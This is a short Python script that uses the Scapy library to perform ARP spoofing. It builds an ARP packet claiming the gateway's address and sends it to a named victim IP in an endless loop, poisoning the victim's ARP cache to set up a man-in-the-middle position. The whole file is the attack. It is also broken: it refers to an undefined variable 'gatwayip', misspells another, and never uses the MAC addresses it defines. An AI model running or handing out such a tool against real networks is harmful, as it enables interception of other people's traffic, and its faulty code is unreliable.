from scapy.all import *


def main():
    gatewayIP = '192.168.82.2'
    victimIP = '192.168.82.156'

    hackMAC = '00:0c:29:f5:eb:46'
    victimMAC = '00:0c:29:08:17:1c'
    getwayMAC = '00:50:56:e4:33:f2'

    packet = Ether()/ARP(psrc=gatwayip,pdst=victimIP)
    while True:
        sendp(packet)
        time.sleep(1)
        print(packet.show())

    pass


if __name__ == '__main__':
    main()